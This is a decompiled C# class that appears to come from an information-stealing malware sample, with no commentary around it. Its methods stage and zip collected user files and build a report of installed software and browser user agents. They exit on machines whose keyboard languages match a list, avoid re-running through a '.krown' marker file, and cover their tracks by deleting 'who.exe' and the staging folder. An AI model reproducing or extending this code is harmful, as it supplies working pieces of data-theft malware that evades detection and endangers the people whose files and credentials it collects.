using System;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ns14;
using ns37;

namespace ns18
{
	// Token: 0x02000024 RID: 36
	internal class Class12
	{
		// Token: 0x06000141 RID: 321 RVA: 0x0000B100 File Offset: 0x00009300
		public static void smethod_0(DirectoryInfo directoryInfo_0)
		{
			try
			{
				FileInfo[] files = directoryInfo_0.GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					files[i].Delete();
				}
				foreach (DirectoryInfo directoryInfo in directoryInfo_0.GetDirectories())
				{
					Class12.smethod_0(directoryInfo);
					directoryInfo.Delete();
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000142 RID: 322 RVA: 0x0000B164 File Offset: 0x00009364
		public static void smethod_1(string string_1, string string_2)
		{
			if (File.Exists(string_2))
			{
				try
				{
					string path = Path.Combine(new string[]
					{
						GClass9.string_16
					});
					if (new FileInfo(string_2).Length != 0L)
					{
						File.Copy(string_2, Path.Combine(path, Path.GetFileName(string_2)), true);
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000143 RID: 323 RVA: 0x0000B1CC File Offset: 0x000093CC
		[CompilerGenerated]
		private static ManagementObject smethod_2(string string_1)
		{
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementClass(string_1).GetInstances().GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					ManagementBaseObject managementBaseObject = enumerator.Current;
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					if (managementObject != null)
					{
						return managementObject;
					}
				}
				goto IL_3D;
			}
			ManagementObject result;
			return result;
			IL_3D:
			return null;
		}

		// Token: 0x06000144 RID: 324 RVA: 0x0000B228 File Offset: 0x00009428
		public static string smethod_3()
		{
			try
			{
				ManagementObject managementObject = Class12.smethod_2("Win32_OperatingSystem");
				if (managementObject == null)
				{
					return string.Empty;
				}
				return managementObject["Version"] as string;
			}
			catch
			{
			}
			return Class12.smethod_3();
		}

		// Token: 0x06000145 RID: 325 RVA: 0x0000B278 File Offset: 0x00009478
		public static void smethod_4()
		{
			foreach (object obj in InputLanguage.InstalledInputLanguages)
			{
				string text = Convert.ToString(((InputLanguage)obj).Culture);
				foreach (string value in GClass9.string_19)
				{
					if (text.Contains(value))
					{
						Class12.smethod_7();
						Environment.Exit(0);
					}
				}
			}
		}

		// Token: 0x06000146 RID: 326 RVA: 0x0000B308 File Offset: 0x00009508
		public static void smethod_5()
		{
			try
			{
				if (File.Exists(GClass9.string_0 + "\\" + Environment.UserName + ".krown"))
				{
					Class12.smethod_7();
					Environment.Exit(0);
				}
				else
				{
					File.Create(GClass9.string_0 + "\\" + Environment.UserName + ".krown");
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000147 RID: 327 RVA: 0x0000B37C File Offset: 0x0000957C
		public static void smethod_6()
		{
			string destinationArchiveFileName = GClass9.string_0 + "\\" + Class23.string_0 + ".zip";
			try
			{
				ZipFile.CreateFromDirectory(GClass9.string_6, destinationArchiveFileName, CompressionLevel.Optimal, false);
			}
			catch
			{
			}
		}

		// Token: 0x06000148 RID: 328 RVA: 0x0000B3D0 File Offset: 0x000095D0
		public static void smethod_7()
		{
			try
			{
				File.Delete(GClass9.string_0 + "\\who.exe");
			}
			catch
			{
				File.SetAttributes(GClass9.string_0 + "\\who.exe", FileAttributes.Hidden);
			}
		}

		// Token: 0x06000149 RID: 329 RVA: 0x00003CB2 File Offset: 0x00001EB2
		public static void smethod_8()
		{
			Class12.smethod_0(new DirectoryInfo(GClass9.string_6));
			File.Delete(GClass9.string_0 + "\\" + Class23.string_0 + ".zip");
		}

		// Token: 0x0600014A RID: 330 RVA: 0x0000B420 File Offset: 0x00009620
		public static void smethod_9()
		{
			if (Class23.list_1.Count > 0)
			{
				for (int i = 0; i < Class23.list_1.Count; i++)
				{
					Class12.string_0 += Class23.list_1[i];
				}
			}
		}

		// Token: 0x0600014B RID: 331 RVA: 0x0000B46C File Offset: 0x0000966C
		public static void smethod_10()
		{
			if (GClass9.list_0.Count > 0)
			{
				Class12.string_0 += "\r\n<===| SOFT |===>";
				for (int i = 0; i < GClass9.list_0.Count; i++)
				{
					Class12.string_0 = Class12.string_0 + "\r\n" + GClass9.list_0[i];
				}
			}
		}

		// Token: 0x0600014C RID: 332 RVA: 0x0000B4DC File Offset: 0x000096DC
		public static void smethod_11()
		{
			if (Class23.list_0.Count > 0)
			{
				Class12.string_0 += "\r\n<===| UserAgents |===>";
				for (int i = 0; i < Class23.list_0.Count; i++)
				{
					Class12.string_0 = Class12.string_0 + "\r\n" + Class23.list_0[i];
				}
			}
		}

		// Token: 0x04000081 RID: 129
		public static string string_0 = "\r\n";
	}
}
